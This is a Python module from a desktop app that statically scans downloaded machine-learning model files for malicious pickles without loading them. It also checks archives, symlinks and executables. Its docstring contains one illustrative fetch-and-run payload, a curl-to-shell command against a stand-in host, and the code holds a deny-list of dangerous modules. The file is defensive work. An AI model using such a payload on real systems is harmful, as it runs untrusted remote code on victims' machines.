"""Static inspection of a downloaded model: the format policy and pickle disassembler.

This is not antivirus in the marketing sense — there are no signatures of
known-malware files here — and the app never calls it that (see
``localcode/security/__init__.py``). What it is: a real, structural check of
the one file format models ship in that executes code when read (Python
pickles), plus a policy for what else has no business sitting in a model
repository.

``localcode/security/sandbox.py`` keeps a model's *engine process* contained
once it runs. This module is the other half: deciding, before anything runs,
whether the files themselves look safe to hand to that engine at all.

The concrete threat is the Python pickle format. ``.bin`` / ``.pt`` / ``.pth``
/ ``.ckpt`` (and PyTorch's zip-wrapped variant of the same) are pickles, and
unpickling is not data deserialisation — a pickle stream is a small stack
program, and one of its opcodes (``REDUCE``) calls an arbitrary callable with
arbitrary arguments. A file crafted as ``(os.system, ("curl evil.sh | sh",))``
runs a shell command the moment something calls ``pickle.load``/``torch.load``
on it. This is not theoretical: it is the standard way malicious "models" on
model-sharing sites have gotten people to run code.

What this module does
----------------------
* Walks a pickle's opcodes with :func:`pickletools.genops` **without ever
  unpickling it** — nothing here calls ``pickle.load``, ``torch.load`` or
  ``eval``. It records every ``GLOBAL``/``STACK_GLOBAL`` (an import the
  pickle references) and notes when a ``REDUCE`` opcode actually calls one.
  Imports are classified against a small allow-list (``torch``, ``numpy``,
  ``collections`` and a handful of harmless builtins — the vocabulary a real
  ``state_dict`` needs) and a deny-list (``os``, ``posix``, ``nt``,
  ``subprocess``, ``shutil``, ``socket``, ``webbrowser``, ``runpy``,
  ``importlib``, and ``builtins``/``__builtin__`` ``eval``/``exec``/
  ``compile``/``__import__``). Anything else is "suspicious": not proven
  dangerous, but not on the list of things a checkpoint has any business
  importing either.
* Looks inside PyTorch's zip archive format (``torch.save`` since 1.6) and
  inside plain ``.tar``/``.tar.gz`` archives, streaming each member pickle
  straight into the same opcode walk instead of extracting it to disk first.
* Applies file-hygiene checks that have nothing to do with pickle: a native
  executable (ELF/Mach-O/PE header) or a ``.sh``/``.py`` script has no reason
  to ship inside a model repository; a symlink pointing outside the model's
  own directory or an archive member named ``../../…`` is a path-traversal
  attempt; an absurd file count or an oddly large "helper" file is worth a
  second look.
* Treats ``.safetensors``, ``.gguf`` and MLX's ``.npz`` as what they are:
  plain tensor data with no code path that executes anything when read. A
  repository that ships only those formats gets a ``clean`` verdict *by
  construction*, not because nothing suspicious happened to be found.

What this module deliberately does **not** do (say this plainly, because an
overstated security claim is worse than none)
------------------------------------------------------------------------------
* It is not a full pickle interpreter. It does not simulate the operand
  stack, so ``REDUCE`` is attributed to "the most recently pushed
  GLOBAL/STACK_GLOBAL", which is right for every real checkpoint (tensors are
  rebuilt by one reducer right after its class is pushed) but is an
  approximation, not a proof, for a pickle deliberately built to confuse that
  heuristic.
* It does not analyse ``.h5``/``.msgpack``/``.joblib`` contents (joblib is
  pickle-based and Keras ``.h5`` files can embed a ``Lambda`` layer's pickled
  code) — those are only flagged by extension, not opcode-walked. Treat a
  "suspicious" verdict on one of those as "not cleared", not "checked".
* It cannot catch a dangerous import given an innocuous-looking name, a
  vulnerability in ``numpy``/``torch`` itself reachable through an "allowed"
  reducer, or anything that only misbehaves once real tensor *values* (not
  the pickle structure) are used downstream.
* It is a static scan, not a sandbox: a "clean" verdict means "no known-bad
  pattern in the file", not "this file is guaranteed safe to run". The
  containment in ``security/sandbox.py`` is what limits the blast radius when
  a scan (this one or any other) misses something.

Cost: reading a model's own pickle metadata is a few kilobytes — the actual
tensor bytes live outside the pickle opcode stream in every format PyTorch
still writes (referenced via ``persistent_id`` in the legacy format, stored as
separate zip members in the current one), so a normal checkpoint is scanned
in milliseconds. A pickle that tries to make the scanner read more than that
is itself treated as a finding (:data:`MAX_PICKLE_BYTES`,
:data:`MAX_PICKLE_OPCODES`) rather than a way to make the scan expensive.
"""

from __future__ import annotations

import os
import pickletools
import stat
import tarfile
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterable, Literal

__all__ = [
    "Finding",
    "ScanReport",
    "scan_path",
    "scan_pickle_stream",
    "scan_pickle_bytes",
    "PICKLE_EXTENSIONS",
    "SAFE_DATA_EXTENSIONS",
]

Severity = Literal["info", "suspicious", "dangerous"]
Verdict = Literal["clean", "suspicious", "dangerous"]

# --------------------------------------------------------------------------- #
# What a file's extension already tells us
# --------------------------------------------------------------------------- #

#: Python pickles: unpickling them can execute code. PyTorch also writes these
#: as zip archives (see ``_looks_like_zip``); both shapes are handled.
PICKLE_EXTENSIONS = (".bin", ".pt", ".pth", ".ckpt", ".pkl", ".pickle")

#: Pure tensor data. Nothing here is code, so loading one cannot execute
#: anything — a repository containing only these is clean by construction.
SAFE_DATA_EXTENSIONS = (".safetensors", ".gguf", ".npz", ".onnx")

#: Text/config siblings every repo ships; excluded from the "oddly large
#: helper file" check so a legitimate big tokenizer.json never gets flagged.
TEXT_LIKE_EXTENSIONS = (
    ".json", ".txt", ".md", ".yaml", ".yml", ".model", ".tiktoken", ".spm",
    ".vocab", ".merges", ".cfg", ".toml", ".csv", ".jsonl", ".license",
)

#: Code that some *other* tool (not LocalCode's own GGUF/MLX loaders) might
#: run — most notably ``transformers`` with ``trust_remote_code=True``.
CODE_EXTENSIONS = (".py", ".pyc", ".pyo", ".sh", ".bash", ".command", ".ps1", ".bat", ".cmd")

#: Pickle-based or pickle-adjacent formats this module flags by extension
#: only — it does not walk their internal opcodes/layers. See module docstring.
UNANALYZED_PICKLE_LIKE_EXTENSIONS = (".joblib", ".msgpack", ".h5", ".hdf5")

#: Native executable magic numbers (ELF, the six Mach-O/fat variants, PE).
_ELF_MAGIC = b"\x7fELF"
_MACHO_MAGICS = (
    b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf", b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe",
    b"\xca\xfe\xba\xbe", b"\xbe\xba\xfe\xca",
)
_PE_MAGIC = b"MZ"

# --------------------------------------------------------------------------- #
# Bounds — what keeps this "cheap enough to run on every download"
# --------------------------------------------------------------------------- #

#: A pickle's own opcode stream is metadata (class refs, tensor shapes/dtypes,
#: a handful of small strings) — never the tensor bytes themselves. Reading
#: more than this from one pickle stream is itself suspicious.
MAX_PICKLE_BYTES = 32 * 1024 * 1024
MAX_PICKLE_OPCODES = 200_000
#: Files scanned per :func:`scan_path` call before it stops and reports the cut-off.
MAX_FILES_SCANNED = 20_000
#: A model repository with more files than this is itself worth a warning.
MAX_REASONABLE_FILES = 3_000
#: Archive members inspected before an archive scan stops and reports the cut-off.
MAX_ARCHIVE_MEMBERS = 5_000
#: A non-weight, non-text file bigger than this is unusual enough to flag.
MAX_MISC_FILE_BYTES = 25 * 1024 * 1024

# --------------------------------------------------------------------------- #
# The pickle import allow-list / deny-list
# --------------------------------------------------------------------------- #

#: module -> allowed qualnames (``None`` = every attribute of that module is
#: dangerous). Every entry here is a way to run a process, touch the
#: filesystem outside the sandbox, reach the network, or execute arbitrary
#: Python — nothing a tensor checkpoint legitimately needs.
DANGEROUS_MODULES: dict[str, frozenset[str] | None] = {
    "os": None,
    "posix": None,
    "nt": None,
    "subprocess": None,
    "shutil": None,
    "socket": None,
    "webbrowser": None,
    "runpy": None,
    "importlib": None,
}
#: ``builtins``/``__builtin__`` names that run arbitrary code even though the
#: module itself is otherwise full of harmless container types.
DANGEROUS_BUILTIN_QUALNAMES = frozenset({"eval", "exec", "compile", "__import__"})

#: Container/scalar builtins a real ``state_dict`` pickle routinely references.
SAFE_BUILTIN_QUALNAMES = frozenset({
    "dict", "list", "tuple", "set", "frozenset", "bytearray", "complex", "slice",
    "object", "bytes", "str", "int", "float", "bool",
})
#: Modules that are entirely safe to import regardless of qualname — this is
#: the vocabulary of a PyTorch/NumPy tensor checkpoint.
_SAFE_EXACT_MODULES = frozenset({"collections", "collections.abc"})
_SAFE_MODULE_PREFIXES = ("torch.", "numpy.")
_SAFE_EXACT_PREFIX_ROOTS = ("torch", "numpy")


def _is_safe_global(module: str, qualname: str) -> bool:
    if module in ("builtins", "__builtin__") and qualname in SAFE_BUILTIN_QUALNAMES:
        return True
    if module in _SAFE_EXACT_MODULES:
        return True
    if module in _SAFE_EXACT_PREFIX_ROOTS or module.startswith(_SAFE_MODULE_PREFIXES):
        return True
    return False


def _classify_global(module: str, qualname: str) -> str:
    """``"dangerous" | "suspicious" | "safe"`` for one pickle GLOBAL/STACK_GLOBAL reference."""
    allowed = DANGEROUS_MODULES.get(module)
    if module in DANGEROUS_MODULES and (allowed is None or qualname in allowed):
        return "dangerous"
    if module in ("builtins", "__builtin__") and qualname in DANGEROUS_BUILTIN_QUALNAMES:
        return "dangerous"
    if _is_safe_global(module, qualname):
        return "safe"
    return "suspicious"


# --------------------------------------------------------------------------- #
# Report shape
# --------------------------------------------------------------------------- #


@dataclass
class Finding:
    """One thing the scan noticed, in Polish for the UI."""

    file: str                      # path relative to the scanned model, "" = the repo as a whole
    kind: str                      # "pickle_import" | "file_policy" | "archive" | "parse_error"
    severity: Severity
    reason: str                    # Polish, user-facing
    detail: str | None = None      # English technical detail (import name, member name, …)

    def to_dict(self) -> dict[str, Any]:
        out: dict[str, Any] = {
            "file": self.file, "kind": self.kind, "severity": self.severity, "reason": self.reason,
        }
        if self.detail:
            out["detail"] = self.detail
        return out


@dataclass
class ScanReport:
    """The result of one :func:`scan_path` call."""

    verdict: Verdict
    summary: str                              # Polish, one line
    findings: list[Finding] = field(default_factory=list)
    files_scanned: int = 0
    files_skipped: int = 0
    pickle_files_analyzed: int = 0
    target: str = ""
    scanned_at: float = field(default_factory=time.time)   # unix seconds

    @property
    def dangerous(self) -> bool:
        return self.verdict == "dangerous"

    @property
    def is_clean(self) -> bool:
        return self.verdict == "clean"

    def to_dict(self) -> dict[str, Any]:
        return {
            "verdict": self.verdict,
            "summary": self.summary,
            "findings": [f.to_dict() for f in self.findings],
            "filesScanned": self.files_scanned,
            "filesSkipped": self.files_skipped,
            "pickleFilesAnalyzed": self.pickle_files_analyzed,
            "target": self.target,
            "scannedAt": int(self.scanned_at * 1000),
        }


def _verdict(findings: Iterable[Finding]) -> Verdict:
    findings = list(findings)
    if any(f.severity == "dangerous" for f in findings):
        return "dangerous"
    if any(f.severity == "suspicious" for f in findings):
        return "suspicious"
    return "clean"


def _summary(verdict: Verdict, *, pickle_analyzed: int, files_scanned: int, findings: list[Finding]) -> str:
    if verdict == "dangerous":
        n = sum(1 for f in findings if f.severity == "dangerous")
        return f"Wykryto niebezpieczne elementy w plikach modelu (liczba: {n}) — wczytanie mogłoby uruchomić kod."
    if verdict == "suspicious":
        n = sum(1 for f in findings if f.severity == "suspicious")
        return f"Znaleziono podejrzane elementy w plikach modelu (liczba: {n}) — sprawdź szczegóły przed wczytaniem."
    if pickle_analyzed:
        return "Przeanalizowano pliki pickle w repozytorium — nie znaleziono niebezpiecznych importów."
    if files_scanned:
        return ("Repozytorium zawiera wyłącznie bezpieczne formaty (safetensors/GGUF/MLX npz) — "
                "nic się nie wykonuje przy wczytywaniu.")
    return "Nie znaleziono żadnych plików do sprawdzenia."


# --------------------------------------------------------------------------- #
# Pickle opcode walk (no unpickling — see module docstring)
# --------------------------------------------------------------------------- #

_STRING_OPCODES = frozenset({
    "SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE", "SHORT_BINSTRING", "BINSTRING",
})


class _ScanBudgetExceeded(Exception):
    """The pickle asked the scanner to read more than a metadata stream ever needs."""


class _BoundedReader:
    """A file object that stops handing out bytes past ``limit``.

    ``pickletools.genops`` reads a pickle stream opcode by opcode — a
    metadata pickle is at most a few kilobytes because the tensor bytes live
    outside the opcode stream (see module docstring). Wrapping the file this
    way means a pickle crafted to make the scanner read (and allocate) a huge
    chunk turns into a bounded, reported "suspicious" result instead of a
    memory-exhaustion vector in the scanner itself.
    """

    def __init__(self, fileobj: Any, limit: int) -> None:
        self._f = fileobj
        self._limit = limit
        self._read = 0

    def _track(self, chunk: bytes) -> bytes:
        self._read += len(chunk)
        if self._read > self._limit:
            raise _ScanBudgetExceeded()
        return chunk

    def _remaining(self) -> int:
        return self._limit - self._read + 1

    def read(self, size: int = -1) -> bytes:
        # Cap the request itself, not just the running total: an opcode that
        # declares its own huge length (BINUNICODE8's 8-byte count, for one)
        # hands that length straight to a single ``read(n)`` call, and a
        # bound checked only *after* the read returns would still let one
        # opcode pull the rest of a huge file into memory before the budget
        # ever gets to complain. Capping ``size`` first turns that into a
        # short read (pickletools then raises its own "not enough bytes"),
        # so the budget is a real per-call ceiling, not just a running total.
        remaining = self._remaining()
        if size is None or size < 0:
            size = remaining
        else:
            size = min(size, remaining)
        return self._track(self._f.read(size))

    def readline(self, size: int = -1) -> bytes:
        # Same reasoning as read(): protocol-0 opcodes (STRING/PUT/GET/INT/...)
        # read a newline-terminated field with no explicit length, so an
        # attacker-supplied stream with no newline for a long stretch must
        # not turn one readline() into "read until EOF".
        remaining = self._remaining()
        if size is None or size < 0:
            size = remaining
        else:
            size = min(size, remaining)
        return self._track(self._f.readline(size))


@dataclass
class _GlobalRef:
    module: str
    qualname: str
    pos: int | None
    opcode: str
    invoked: bool = False


def _walk_pickle_opcodes(fileobj: Any) -> tuple[list[_GlobalRef], bool]:
    """Every ``GLOBAL``/``STACK_GLOBAL`` reference in a pickle stream, and whether it was truncated.

    ``invoked`` is an approximation (see module docstring): true when a
    ``REDUCE`` opcode is seen while this reference is the most recently
    pushed global — exactly what every real tensor-rebuilding pickle does,
    even though this is not a full stack simulation.
    """
    bounded = _BoundedReader(fileobj, MAX_PICKLE_BYTES)
    refs: list[_GlobalRef] = []
    recent: list[str] = []
    pending: _GlobalRef | None = None
    truncated = False
    count = 0
    try:
        for opcode, arg, pos in pickletools.genops(bounded):
            count += 1
            if count > MAX_PICKLE_OPCODES:
                truncated = True
                break
            name = opcode.name
            if name in _STRING_OPCODES and isinstance(arg, str):
                recent.append(arg)
                del recent[:-2]
            if name == "GLOBAL" and isinstance(arg, str):
                if pending is not None:
                    refs.append(pending)
                module, _, qualname = arg.partition(" ")
                pending = _GlobalRef(module, qualname, pos, name)
                recent.clear()
            elif name == "STACK_GLOBAL":
                if pending is not None:
                    refs.append(pending)
                pending = _GlobalRef(recent[-2], recent[-1], pos, name) if len(recent) >= 2 else None
                recent.clear()
            elif name == "REDUCE" and pending is not None:
                pending.invoked = True
    except _ScanBudgetExceeded:
        truncated = True
    if pending is not None:
        refs.append(pending)
    return refs, truncated


def scan_pickle_stream(fileobj: Any, *, label: str = "pickle") -> list[Finding]:
    """Findings for one pickle stream (a file object opened for binary reading).

    Never unpickles the stream; only reads opcodes (see module docstring).
    Malformed input (garbage, truncated data, not actually a pickle) becomes
    a ``suspicious`` finding rather than an exception.
    """
    try:
        refs, truncated = _walk_pickle_opcodes(fileobj)
    except Exception as exc:  # noqa: BLE001 - untrusted, possibly malformed input
        return [Finding(
            file=label, kind="parse_error", severity="suspicious",
            reason="Nie udało się przeanalizować zawartości pliku pickle — potraktuj go jako niezaufany.",
            detail=f"{type(exc).__name__}: {exc}",
        )]
    findings: list[Finding] = []
    for ref in refs:
        severity = _classify_global(ref.module, ref.qualname)
        if severity == "safe":
            continue
        full = f"{ref.module}.{ref.qualname}" if ref.qualname else ref.module
        if severity == "dangerous":
            reason = (f"Wczytanie pliku może wykonać „{full}” — to pozwala uruchomić polecenia "
                      "systemowe albo dowolny kod Pythona.")
        else:
            reason = (f"Plik importuje „{full}”, którego nie ma na liście bezpiecznych importów "
                      "(torch/numpy/collections) — nie wiadomo, co robi przy wczytaniu.")
        if ref.invoked:
            reason += " Ten import jest też wywoływany w pliku (opcode REDUCE)."
        findings.append(Finding(file=label, kind="pickle_import", severity=severity, reason=reason, detail=full))
    if truncated:
        findings.append(Finding(
            file=label, kind="pickle_import", severity="suspicious",
            reason=("Analiza pliku pickle została przerwana — jego opakowanie danych jest nietypowo "
                    "duże lub złożone jak na metadane wag."),
            detail="truncated",
        ))
    return findings


def scan_pickle_bytes(data: bytes, *, label: str = "pickle") -> list[Finding]:
    """:func:`scan_pickle_stream` over an in-memory pickle (tests, small payloads)."""
    import io
    return scan_pickle_stream(io.BytesIO(data), label=label)


# --------------------------------------------------------------------------- #
# Archives: PyTorch's zip format, and plain tar
# --------------------------------------------------------------------------- #


def _is_traversal(name: str) -> bool:
    if not name:
        return False
    normalized = name.replace("\\", "/")
    if normalized.startswith("/") or (len(normalized) > 1 and normalized[1] == ":"):
        return True
    return any(part == ".." for part in normalized.split("/"))


def _read_magic(path: Path, n: int = 4) -> bytes:
    try:
        with open(path, "rb") as fh:
            return fh.read(n)
    except OSError:
        return b""


def _looks_like_zip(path: Path) -> bool:
    return _read_magic(path, 2) == b"PK"


def _looks_like_tar(path: Path, suffix: str) -> bool:
    name_lower = path.name.lower()
    if suffix in (".tar", ".tgz") or name_lower.endswith((".tar.gz", ".tar.bz2", ".tar.xz")):
        return True
    try:
        with open(path, "rb") as fh:
            fh.seek(257)
            return fh.read(5) == b"ustar"
    except OSError:
        return False


def _scan_zip_archive(path: Path, rel: str) -> list[Finding]:
    findings: list[Finding] = []
    try:
        with zipfile.ZipFile(path) as zf:
            infos = zf.infolist()
            if len(infos) > MAX_ARCHIVE_MEMBERS:
                findings.append(Finding(
                    file=rel, kind="archive", severity="suspicious",
                    reason=f"Archiwum zawiera nietypowo dużo plików (liczba: {len(infos)}).",
                    detail="member_count"))
                infos = infos[:MAX_ARCHIVE_MEMBERS]
            for info in infos:
                name = info.filename
                if _is_traversal(name):
                    findings.append(Finding(
                        file=rel, kind="archive", severity="dangerous",
                        reason=f"Element archiwum „{name}” próbuje wyjść poza katalog modelu (ścieżka z „..”).",
                        detail=name))
                    continue
                if info.compress_size > 4096 and info.file_size > info.compress_size * 500:
                    ratio = info.file_size / max(1, info.compress_size)
                    findings.append(Finding(
                        file=rel, kind="archive", severity="suspicious",
                        reason=f"Element „{name}” rozpakowuje się {ratio:.0f}x — wygląda na bombę kompresji.",
                        detail=name))
                lower = name.lower()
                if lower.endswith((".pkl", ".pickle")):
                    try:
                        with zf.open(info) as member:
                            findings.extend(scan_pickle_stream(member, label=f"{rel}!{name}"))
                    except (zipfile.BadZipFile, OSError, RuntimeError) as exc:
                        findings.append(Finding(
                            file=rel, kind="parse_error", severity="suspicious",
                            reason=f"Nie udało się otworzyć elementu archiwum „{name}”: {exc}.", detail=name))
                elif lower.endswith(CODE_EXTENSIONS):
                    findings.append(Finding(
                        file=rel, kind="archive", severity="suspicious",
                        reason=f"Archiwum zawiera plik kodu „{name}”.", detail=name))
    except (zipfile.BadZipFile, OSError) as exc:
        findings.append(Finding(
            file=rel, kind="parse_error", severity="suspicious",
            reason=f"Nie udało się otworzyć archiwum ZIP: {exc}.", detail=str(exc)))
    return findings


def _scan_tar_archive(path: Path, rel: str) -> list[Finding]:
    findings: list[Finding] = []
    try:
        with tarfile.open(path, mode="r:*") as tf:
            members = tf.getmembers()
            if len(members) > MAX_ARCHIVE_MEMBERS:
                findings.append(Finding(
                    file=rel, kind="archive", severity="suspicious",
                    reason=f"Archiwum zawiera nietypowo dużo plików (liczba: {len(members)}).",
                    detail="member_count"))
                members = members[:MAX_ARCHIVE_MEMBERS]
            for member in members:
                name = member.name
                if _is_traversal(name):
                    findings.append(Finding(
                        file=rel, kind="archive", severity="dangerous",
                        reason=f"Element archiwum „{name}” próbuje wyjść poza katalog modelu (ścieżka z „..”).",
                        detail=name))
                    continue
                if member.issym() or member.islnk():
                    target = member.linkname or ""
                    if _is_traversal(target) or os.path.isabs(target):
                        findings.append(Finding(
                            file=rel, kind="archive", severity="dangerous",
                            reason=f"Dowiązanie „{name}” w archiwum wskazuje poza katalog modelu.",
                            detail=target))
                    continue
                if not member.isfile():
                    continue
                lower = name.lower()
                if lower.endswith(PICKLE_EXTENSIONS):
                    try:
                        extracted = tf.extractfile(member)
                        if extracted is not None:
                            findings.extend(scan_pickle_stream(extracted, label=f"{rel}!{name}"))
                    except (tarfile.TarError, OSError) as exc:
                        findings.append(Finding(
                            file=rel, kind="parse_error", severity="suspicious",
                            reason=f"Nie udało się otworzyć elementu archiwum „{name}”: {exc}.", detail=name))
                elif lower.endswith(CODE_EXTENSIONS):
                    findings.append(Finding(
                        file=rel, kind="archive", severity="suspicious",
                        reason=f"Archiwum zawiera plik kodu „{name}”.", detail=name))
    except (tarfile.TarError, OSError) as exc:
        findings.append(Finding(
            file=rel, kind="parse_error", severity="suspicious",
            reason=f"Nie udało się otworzyć archiwum tar: {exc}.", detail=str(exc)))
    return findings


def _scan_pickle_or_archive_file(path: Path, rel: str) -> list[Finding]:
    """A ``.bin``/``.pt``/``.pth``/``.ckpt``/… file: plain pickle, or PyTorch's zip/tar wrapping one."""
    if _looks_like_zip(path):
        return _scan_zip_archive(path, rel)
    if _looks_like_tar(path, path.suffix.lower()):
        return _scan_tar_archive(path, rel)
    try:
        with open(path, "rb") as fh:
            return scan_pickle_stream(fh, label=rel)
    except OSError as exc:
        return [Finding(
            file=rel, kind="parse_error", severity="suspicious",
            reason=f"Nie udało się otworzyć pliku: {exc}.", detail=str(exc))]


# --------------------------------------------------------------------------- #
# File policy: things that have no business being in a model repo
# --------------------------------------------------------------------------- #


def _is_native_executable(magic: bytes) -> bool:
    if magic.startswith(_ELF_MAGIC) or magic[:2] == _PE_MAGIC:
        return True
    return any(magic.startswith(m) for m in _MACHO_MAGICS)


def _file_policy_findings(path: Path, rel: str, st: os.stat_result) -> list[Finding]:
    findings: list[Finding] = []
    suffix = path.suffix.lower()
    magic = _read_magic(path)
    executable_bit = bool(st.st_mode & 0o111)
    if _is_native_executable(magic):
        findings.append(Finding(
            file=rel, kind="file_policy", severity="dangerous",
            reason=(f"Plik „{path.name}” jest natywnym programem wykonywalnym (nagłówek ELF/Mach-O/PE) — "
                    "to nie ma prawa być w repozytorium modelu."),
            detail="native_executable"))
    elif suffix in CODE_EXTENSIONS:
        findings.append(Finding(
            file=rel, kind="file_policy", severity="suspicious",
            reason=(f"Plik „{path.name}” to kod ({suffix}) — LocalCode go nie uruchamia automatycznie, "
                    "ale inne narzędzia (np. transformers z trust_remote_code) by go wykonały."),
            detail="code_file"))
    elif executable_bit and suffix not in SAFE_DATA_EXTENSIONS:
        findings.append(Finding(
            file=rel, kind="file_policy", severity="suspicious",
            reason=f"Plik „{path.name}” ma ustawione prawo wykonywania — nietypowe dla pliku modelu.",
            detail="executable_bit"))
    if suffix in UNANALYZED_PICKLE_LIKE_EXTENSIONS:
        findings.append(Finding(
            file=rel, kind="file_policy", severity="suspicious",
            reason=(f"Plik „{path.name}” ({suffix}) może też wykonać kod przy wczytaniu (np. joblib/pickle, "
                    "warstwy Lambda w Keras), ale LocalCode nie analizuje go opcode po opcode — potraktuj go "
                    "z taką samą ostrożnością jak plik pickle."),
            detail="unanalyzed_pickle_like"))
    if (suffix not in PICKLE_EXTENSIONS and suffix not in SAFE_DATA_EXTENSIONS
            and suffix not in TEXT_LIKE_EXTENSIONS and suffix not in UNANALYZED_PICKLE_LIKE_EXTENSIONS
            and st.st_size > MAX_MISC_FILE_BYTES):
        findings.append(Finding(
            file=rel, kind="file_policy", severity="suspicious",
            reason=(f"Plik „{path.name}” ({st.st_size / 1e6:.0f} MB) jest nietypowo duży jak na plik "
                    "pomocniczy modelu."),
            detail="large_misc_file"))
    return findings


def _check_symlink(path: Path, root: Path, rel: str) -> list[Finding]:
    try:
        target = path.resolve(strict=False)
    except OSError:
        return [Finding(
            file=rel, kind="file_policy", severity="suspicious",
            reason=f"Nie udało się rozwiązać dowiązania symbolicznego „{path.name}”.",
            detail="unresolved_symlink")]
    try:
        root_resolved = root.resolve(strict=False)
    except OSError:
        root_resolved = root
    if target != root_resolved and not target.is_relative_to(root_resolved):
        return [Finding(
            file=rel, kind="file_policy", severity="dangerous",
            reason=f"Dowiązanie symboliczne „{path.name}” prowadzi poza katalog modelu.",
            detail=str(target))]
    return []


# --------------------------------------------------------------------------- #
# Directory walk and the public entry point
# --------------------------------------------------------------------------- #

_IGNORED_DIR_NAMES = frozenset({".git", ".cache", ".locks", "__pycache__", ".ipynb_checkpoints"})
_IGNORED_FILE_NAMES = frozenset({".DS_Store", ".gitattributes"})


def _walk(root: Path) -> list[Path]:
    out: list[Path] = []
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        dirnames[:] = [d for d in dirnames if d not in _IGNORED_DIR_NAMES and not d.startswith(".")]
        base = Path(dirpath)
        for name in filenames:
            if name in _IGNORED_FILE_NAMES:
                continue
            out.append(base / name)
    return out


def _rel(root: Path, path: Path) -> str:
    try:
        return str(path.relative_to(root))
    except ValueError:
        return str(path)


def scan_path(target: str | Path, *, max_files: int = MAX_FILES_SCANNED) -> ScanReport:
    """Scan a single model file or a whole model directory.

    Cheap and streaming: safe-format files (``.safetensors``/``.gguf``/
    ``.npz``) are recognised by extension and never opened; pickle-bearing
    files are opcode-walked with a byte/opcode budget (see module docstring),
    never fully read into memory. Suitable to run after every download and
    every local import.
    """
    root = Path(target).expanduser()
    scanned_at = time.time()
    if not root.exists():
        return ScanReport(
            verdict="suspicious",
            summary="Nie znaleziono pliku ani katalogu do przeskanowania.",
            findings=[Finding(file=str(root), kind="file_policy", severity="suspicious",
                               reason="Ścieżka nie istnieje.", detail="missing_path")],
            target=str(root), scanned_at=scanned_at)

    is_single_file = root.is_file()
    scan_root_dir = root.parent if is_single_file else root
    entries = [root] if is_single_file else sorted(_walk(root))

    findings: list[Finding] = []
    if not is_single_file and len(entries) > MAX_REASONABLE_FILES:
        findings.append(Finding(
            file="", kind="file_policy", severity="suspicious",
            reason=f"Repozytorium zawiera nietypowo dużo plików (liczba: {len(entries)}) jak na model.",
            detail="file_count"))

    files_scanned = 0
    files_skipped = 0
    pickle_analyzed = 0
    for i, path in enumerate(entries):
        if i >= max_files:
            files_skipped += len(entries) - i
            findings.append(Finding(
                file="", kind="file_policy", severity="suspicious",
                reason=f"Zatrzymano skanowanie po {max_files} plikach.", detail="max_files"))
            break
        rel = _rel(scan_root_dir, path)
        try:
            st = path.lstat()
        except OSError:
            files_skipped += 1
            continue
        if stat.S_ISLNK(st.st_mode):
            findings.extend(_check_symlink(path, scan_root_dir, rel))
            files_scanned += 1
            continue
        if not path.is_file():
            continue
        findings.extend(_file_policy_findings(path, rel, st))
        suffix = path.suffix.lower()
        if suffix in PICKLE_EXTENSIONS:
            pickle_analyzed += 1
            findings.extend(_scan_pickle_or_archive_file(path, rel))
        elif suffix in SAFE_DATA_EXTENSIONS:
            pass  # data, not code — nothing to inspect
        elif _looks_like_zip(path):
            pickle_analyzed += 1
            findings.extend(_scan_zip_archive(path, rel))
        elif _looks_like_tar(path, suffix):
            pickle_analyzed += 1
            findings.extend(_scan_tar_archive(path, rel))
        files_scanned += 1

    verdict = _verdict(findings)
    summary = _summary(verdict, pickle_analyzed=pickle_analyzed, files_scanned=files_scanned, findings=findings)
    return ScanReport(
        verdict=verdict, summary=summary, findings=findings, files_scanned=files_scanned,
        files_skipped=files_skipped, pickle_files_analyzed=pickle_analyzed,
        target=str(root), scanned_at=scanned_at)
